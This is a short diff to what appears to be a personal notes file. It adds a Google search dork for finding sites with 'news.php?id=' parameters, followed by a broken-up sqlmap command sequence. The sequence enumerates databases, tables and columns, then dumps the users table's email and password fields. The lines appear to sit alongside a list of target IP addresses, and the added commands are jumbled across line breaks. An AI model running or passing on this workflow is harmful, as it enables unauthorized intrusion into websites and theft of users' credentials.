@@ -1,3 +1,11 @@
 TJ-187.66.128.240
 ga-187.66.128.240
 ga2-172.28.0.53
+inurl:""news.php?id="
+sqlmap -u site --dbs 
+sqlmap -u site -D .. 
+--tables sqlmap -u site -D ..
+-T users --columns sqlmap -u 
+site -D
+.. -T users -C 
+users_email,user_password --dump
